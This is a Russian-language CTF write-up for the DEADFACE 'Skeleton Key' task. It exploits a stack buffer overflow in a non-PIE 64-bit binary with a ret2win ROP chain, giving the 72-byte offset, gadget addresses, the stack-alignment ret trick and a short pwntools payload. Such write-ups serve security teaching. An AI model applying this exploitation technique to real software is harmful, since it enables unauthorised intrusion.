# Skeleton Key — DEADFACE CTF (ret2win + выравнивание стека)

Oct 18, 2026 · @Demian

## Условие

Pwn-таск DEADFACE. 64-битный ELF **без PIE**. Программа выдаёт тематический текст («ты нашёл ключ глубоко в склепе… но умеешь ли им пользоваться?») и читает ввод в буфер с переполнением.

## Разбор

Переполнение буфера до адреса возврата — **72 байта** (64 байта буфера + сохранённый `rbp`). Есть готовая `win`-функция по адресу `0x401507`, которая и даёт флаг.

Нюанс: `win` в какой-то момент вызывает библиотечную функцию (например, `system`/`printf`), которая на x86-64 требует выравнивания стека по 16 байт (`movaps`). Если прыгнуть в `win` напрямую, стек окажется невыровнен и программа упадёт на `movaps ... , xmm`. Поэтому перед `win` вставляем «пустой» гаджет `ret` — он сдвигает стек на 8 байт и восстанавливает выравнивание.

## ROP-цепочка

```
[ 72 x 'A' ]        # паддинг до адреса возврата
p64(RET)            # 0x401016 — выравнивание стека на 16 байт
p64(POP_RDI)        # 0x401615 — pop rdi; ret (подготовить аргумент)
p64(0xdeadc0de)     # значение в rdi (для win неважно/заглушка)
p64(WIN)            # 0x401507 — собственно win()
```

Гаджеты (`pop rdi; ret`, `ret`) находятся через `ROPgadget --binary ./chall`.

## Эксплойт

[`exploit.py`](./exploit.py):

```python
payload  = b'A' * 72
payload += p64(RET)          # выравнивание
payload += p64(POP_RDI)
payload += p64(0xdeadc0de)
payload += p64(WIN)

io.sendline(payload)
io.interactive()
```

## Итог

Классический ret2win без PIE. Единственная тонкость — выравнивание стека: без лишнего `ret` перед вызовом `win` эксплойт падает на `movaps` в прологе библиотечной функции. Это частая «грабля» в 64-битных ret2win/ret2libc задачах.
